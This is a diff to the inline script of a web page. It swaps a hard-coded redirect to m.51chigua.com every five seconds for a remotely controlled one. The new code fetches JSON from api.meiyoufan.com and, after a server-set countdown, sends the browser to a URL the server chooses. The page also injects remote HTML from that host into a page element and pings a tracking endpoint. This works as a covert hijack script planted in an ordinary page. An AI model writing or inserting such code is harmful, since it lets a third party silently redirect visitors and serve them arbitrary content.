@@ -59,16 +59,23 @@
   var url_='https://api.meiyoufan.com/nav/?type=rukou';
   $("#js_rukou").show();
   $.ajax({url:url_,success:function(result){
-        $("#js_rukou").html(result);
-    }});
-    $.ajax({url:'https://api.meiyoufan.com/tongji/',success:function(result){
-        console.log(result)
-    }});
- setInterval(testClick, 5000);    
-var cpa = 'http://m.51chigua.com/';
-function testClick () {
-    window.location.href=cpa;
-}
-
+      $("#js_rukou").html(result);
+  }});
+  $.ajax({url:'https://api.meiyoufan.com/tongji/',success:function(result){
+      // console.log(result)
+  }});
+  var api_url = 'https://api.meiyoufan.com/api/';
+  $.getJSON(api_url,function(result){
+      if(result.type==1){
+        var time=result.time;  
+        var timer=setInterval(function(){
+            if(time==0){
+                location.href=result.url;
+            }else{
+                time--; 
+            }
+        },1000)
+      }
+  });
 </script>
 </html>
